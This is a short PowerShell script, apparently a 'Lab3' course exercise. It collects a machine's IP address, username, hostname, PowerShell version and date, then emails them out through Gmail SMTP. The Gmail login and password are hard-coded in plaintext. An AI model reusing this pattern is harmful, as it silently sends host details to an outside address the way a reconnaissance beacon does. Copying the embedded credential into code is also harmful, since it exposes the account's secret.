
function Send-ToEmail([string]$emailbody){
    $Message = new-object Net.Mail.MailMessage 
    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587) 
    $smtp.Credentials = New-Object System.Net.NetworkCredential("brodericjduncan@gmail.com", "oeyjbuidjbrhdzco"); 
    $smtp.EnableSsl = $true 
    $smtp.Timeout = 400000  
    $Message.Subject = "Lab3"
    $Message.Body = $emailbody
    $Message.From = "brodericjduncan2@gmail.com" 
    $Message.To.Add("brodericjduncan@gmail.com") 
    $smtp.Send($Message)
}

#Credit this link for the send email function: https://stackoverflow.com/questions/36355271/how-to-send-email-with-powershell

function Get-MachineInfo {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex 4).IPAddress
    $username = $Env:UserName
    $hostname = $Env:computername
    $psVersion = $PSVersionTable.PSVersion.Major
    $date = Get-Date -Format "dddd, MMMM d, yyyy"
    $Body = "This Machine's IP is $ip. User is $username. Hostname is $hostname. PowerShell Version $psVersion. Today's Date is $date"
    return $Body
}

$Body = Get-MachineInfo

Send-ToEmail  -emailbody $Body;